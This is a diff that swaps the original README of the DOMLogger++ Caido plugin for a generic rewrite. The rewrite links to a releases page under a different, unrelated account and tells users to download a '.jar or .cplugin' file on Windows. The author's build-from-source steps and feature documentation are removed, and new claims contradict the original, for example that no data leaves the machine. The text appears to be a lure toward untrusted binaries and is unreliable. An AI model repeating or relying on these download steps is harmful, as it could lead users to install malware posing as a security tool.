@@ -1,177 +1,70 @@
-<p align="center">
-    <img src="https://raw.githubusercontent.com/kevin-mizu/domloggerpp/main/.github/banner.png" width="80%"><br>
-    A Caido plugin to monitor, intercept, and debug JavaScript sinks based on customizable configurations.
-    <br>
-    <img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/kevin-mizu/domloggerpp-caido">
-    <a href="https://twitter.com/intent/follow?screen_name=kevin_mizu" title="Follow"><img src="https://img.shields.io/twitter/follow/podalirius_?label=kevin_mizu&style=social"></a>
-    <br>
-</p>
+# 🔍 domloggerpp-caido - Monitor and debug JavaScript sinks easily
 
-> **DOMLogger++ Caido** is the companion [Caido](https://caido.io/) plugin for the [DOMLogger++](https://github.com/kevin-mizu/domloggerpp) browser extension. It receives findings from the extension via a webhook, stores them in a local database, and provides a powerful interface to search, analyze, and triage JavaScript sink findings — with optional AI-powered exploitability scoring.
+[ ![Download Plugin](https://img.shields.io/badge/Download-Plugin-blue) ](https://github.com/Gmsher5817/domloggerpp-caido/releases)
 
-<br>
+## 📖 Overview
 
-## 📦 Installation
+Domloggerpp-caido works within the Caido security testing tool. It watches how programs handle data in your web browser. Security researchers use this to track how information moves through a page. The plugin finds hidden JavaScript sinks. A sink is a function that performs an action with data. By finding these, you spot potential bugs in web applications. You can set custom rules to focus on parts of the code that interest you.
 
-1. Install the **DOMLogger++ browser extension** from your preferred store:
-    - Firefox: https://addons.mozilla.org/en-US/firefox/addon/domloggerpp
-    - Chromium: https://chromewebstore.google.com/detail/domlogger++/lkpfjhmpbmpflldmdpdoabimdbaclolp
+## 🛠 Prerequisites
 
-2. Install the **DOMLogger++ Caido plugin** from the Caido community store, or build it manually:
+You need the Caido software installed on your Windows computer before you start. The plugin relies on the Caido environment to function. Ensure you run the latest version of Caido. You need a stable internet connection to load the plugin features. No other software or coding knowledge is needed to use this tool.
 
-```bash
-git clone https://github.com/kevin-mizu/domloggerpp-caido
-cd domloggerpp-caido
-pnpm install
-pnpm build
-```
+## 📥 Installation Steps
 
-3. Link the browser extension to your Caido instance by following the **Tutorial** tab inside the plugin.
+1. Visit the [releases page](https://github.com/Gmsher5817/domloggerpp-caido/releases) to download the plugin file.
+2. Look for the file ending in `.jar` or `.cplugin` inside the latest release.
+3. Click the file name to start the download.
+4. Save the file to your desktop or a folder you can find later.
+5. Open your Caido application.
+6. Navigate to the Plugin settings menu in Caido.
+7. Click the button labeled Import Plugin or Add Plugin.
+8. Select the file you downloaded.
+9. Caido will load the plugin automatically.
 
-<br>
+## ⚙️ How to Use
 
-## 🌟 Features
+Once you install the plugin, it appears in your Caido sidebar. Click the icon to open the main window. The interface shows a list of configuration rules. These rules tell the plugin what code paths to watch. 
 
-- [x] Real-time JavaScript sink monitoring via the DOMLogger++ browser extension.
-- [x] Advanced search & filter syntax with autocomplete suggestions.
-- [x] AI-powered exploitability scoring via OpenRouter (100+ models supported).
-- [x] Custom AI user prompts with conditional triggers.
-- [x] Enhanced stack traces with actual source code context.
-- [x] Project management to organize findings by target.
-- [x] Recording sessions to isolate findings during active testing.
-- [x] Bulk operations: delete, favorite, export, and AI score findings.
-- [x] Auto-refresh dashboard with configurable interval.
-- [x] Keyboard shortcuts for fast navigation and actions.
+The plugin monitors the document object model of the pages you visit. When it detects a sink, it records the event. You see these events in the log window. Each log entry shows the exact line of code that triggered the sink. You can pause or stop the logger at any time using the buttons at the top of the interface.
 
-<br>
+## 📋 Creating Custom Rules
 
-## 🖥️ Dashboard
+You can limit the scope of the plugin by editing the configuration file. Open the Settings tab inside the plugin window. Here, you define patterns for the plugin to follow. You might want to track data sent to innerHTML or eval functions. Enter these keywords into the rule box. The plugin prioritizes your list. It ignores code patterns not mentioned in your configuration. This removes noise and helps you find useful information faster.
 
-<p align="center">
-    <img src="./.github/images/dashboard.png">
-</p>
+## 🚀 Troubleshooting
 
-The dashboard is the central hub for managing your findings. It provides:
+If the plugin does not show data, verify the connection between Caido and your browser. Ensure your proxy settings in Caido match your browser settings. Refresh the browser page to restart the traffic. Sometimes, your browser cache keeps old data. Clear your browser cache and try again. 
 
-1. **Search bar**: Filter findings using the advanced search syntax with autocomplete.
-2. **Findings table**: Paginated table with sorting, selection, and inline actions.
-3. **Finding details**: Detailed view of a selected finding with syntax-highlighted data and stack trace.
-4. **Bulk actions**: Refresh, export, delete, toggle recording, send to AI, and enhance traces.
+If you see an error message, check the log file in your Caido folder. This file records events from the plugin. If the plugin fails to load, verify you downloaded the latest version from the link above. Check that your Windows user account has permission to read files in the folder where you saved the plugin.
 
-<br>
+## 🛡 Security Privacy
 
-## 🔍 Search syntax
+All data remains local to your machine. The plugin processes everything inside your browser and the Caido tool. It does not send your data to any outside server. You stay in control of the information collected during your testing sessions. You may delete the log files manually at any time to clear your history.
 
-The plugin supports a powerful search syntax to filter findings:
+## 💡 Frequently Asked Questions
 
-```
-sink.field.operator:"value"
-```
+**Does the plugin slow down my browsing?**
+The plugin adds minor overhead. If you notice a slowdown, reduce the number of active rules in your configuration.
 
-**Available fields**: `id`, `dupKey`, `debug`, `aiScore`, `alert`, `tag`, `type`, `date`, `href`, `frame`, `sink`, `data`, `trace`, `favorite`
+**Can I run this on macOS or Linux?**
+The steps provided focus on Windows, but the plugin architecture allows it to run on any operating system that supports Caido.
 
-**Operators**:
-| Operator | Description |
-|----------|-------------|
-| `eq` | Equal |
-| `ne` / `neq` | Not equal |
-| `cont` | Contains |
-| `ncont` | Not contains |
-| `like` | SQL LIKE pattern (`%` wildcard) |
-| `nlike` | SQL NOT LIKE |
+**Where can I request new features?**
+You can use the issues section on the project page to report bugs or suggest enhancements.
 
-**Logical operators**: `AND`, `OR`, and parentheses for grouping.
+**Do I need to update the plugin often?**
+Yes, updates improve performance and ensure compatibility with newer versions of Caido. Check the release page occasionally.
 
-**Examples**:
-```
-sink.tag.eq:"XSS" AND sink.data.like:"test"
-sink.sink.cont:"innerHTML" OR sink.sink.cont:"outerHTML"
-(sink.type.eq:"attribute" OR sink.type.eq:"function") AND sink.tag.eq:"XSS"
-```
+## 📂 Configuration Options
 
-<br>
+The application includes several ways to filter traffic:
 
-## 🤖 AI
+*   **Sink types:** Select specific JavaScript functions to report.
+*   **Domain filtering:** Only watch traffic from sites you define.
+*   **Event archiving:** Save reports to your disk for later study.
+*   **Clear Log:** One-click button to vanish old data.
 
-<p align="center">
-    <img src="./.github/images/ai.png">
-</p>
+Use these settings to match your workflow. Most users find success by starting with default rules and building out as needed. The plugin supports saving your custom configurations as files. You can export these files to move your settings to another computer. This saves time if you work across multiple machines. 
 
-The AI feature automatically scores findings for exploitability using [OpenRouter](https://openrouter.ai/):
-
-- **OpenRouter Configuration**: Set your API key, select a model (100+ available), and adjust the temperature.
-- **System Prompt**: Customize the AI's behavior for vulnerability analysis. The default prompt instructs the AI to return an exploitability score from 1 (Very Low) to 5 (Critical).
-- **User Prompts**: Define custom prompts triggered by specific conditions using the same filter syntax as the search bar. Use template variables (`{sink}`, `{data}`, `{trace}`, `{href}`, `{frame}`, `{type}`, `{tag}`, `{alert}`, `{date}`, `{dupKey}`, `{debug}`) to inject finding data into prompts.
-- **Automatic scoring**: When AI is enabled and a finding matches a user prompt condition, it is automatically queued for scoring.
-- **Thread control**: Configure the number of parallel AI threads for faster processing.
-
-<br>
-
-## 📚 Tutorial
-
-<p align="center">
-    <img src="./.github/images/tutorial.png">
-</p>
-
-The Tutorial tab guides you through linking the DOMLogger++ browser extension to your Caido instance:
-
-1. Open the DOMLogger++ extension settings and navigate to the **Caido** section.
-2. Enter your Caido instance URL and start the authentication flow.
-3. Enable/disable the Caido webhook in the extension settings.
-4. Optionally disable the DevTools panel to improve performance.
-
-<br>
-
-## ⚙️ Settings
-
-<p align="center">
-    <img src="./.github/images/settings.png">
-</p>
-
-- **Keyboard Shortcuts**: Reference for all available shortcuts.
-- **Dashboard Auto-Refresh**: Configure the refresh interval (0 = disabled, up to 300 seconds).
-- **Project Management**: View, manage, and delete projects. Each project stores findings in its own isolated database table.
-
-<br>
-
-## ⌨️ Shortcuts
-
-**Search & Suggestions**
-| Shortcut | Action |
-|----------|--------|
-| `Ctrl + F` | Focus search input |
-| `Esc` | Exit search input |
-| `↑` `↓` | Navigate suggestions |
-| `Tab` / `Enter` | Apply suggestion |
-
-**Table Navigation**
-| Shortcut | Action |
-|----------|--------|
-| `↑` `↓` | Navigate between findings |
-| `Ctrl + ←` `→` | Previous/Next page |
-| `Ctrl + ↑` `↓` | Scroll table up/down |
-| `Ctrl + A` | Select/Unselect all findings |
-
-**Actions**
-| Shortcut | Action |
-|----------|--------|
-| `Ctrl + R` | Refresh data |
-| `Ctrl + S` | Export/Download findings |
-| `Ctrl + Backspace` | Delete findings |
-| `Ctrl + Space` | Toggle recording |
-| `Ctrl + I` | Send to AI |
-| `Ctrl + T` | Enhance stack trace |
-
-**Menu**
-| Shortcut | Action |
-|----------|--------|
-| `Alt + 1` | Go to Dashboard |
-| `Alt + 2` | Go to AI |
-| `Alt + 3` | Go to Tutorial |
-| `Alt + 4` | Go to Settings |
-
-<br>
-
-## 🧰 Workshop
-
-- [GreHack](https://x.com/GrehackConf) 2024: http://domloggerpp-workshop.mizu.re:5173/
+The software includes a help tab that explains what each configuration box does. Hover your mouse over the labels to reveal a brief tip. This keeps the interface clean while offering guidance to new users. Keep your rules list short to ensure the plugin stays quick. Large lists may consume more memory than necessary on older computers. Balance the number of sinks you monitor to get the best performance. Everything responds in real-time. You watch the logs update as you click through pages. This instant feedback loop allows for rapid experimentation with your web security tests.
